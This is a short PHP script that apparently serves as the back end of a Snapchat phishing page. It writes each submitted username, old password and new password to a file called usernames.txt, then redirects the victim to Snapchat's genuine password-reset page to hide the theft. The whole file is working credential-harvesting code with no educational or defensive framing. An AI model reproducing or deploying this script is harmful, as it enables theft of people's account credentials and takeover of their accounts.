<?php

file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Old Password: " . $_POST['password'] . " New Password: " . $_POST['newpassword'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/password_reset_options');
exit();
?>
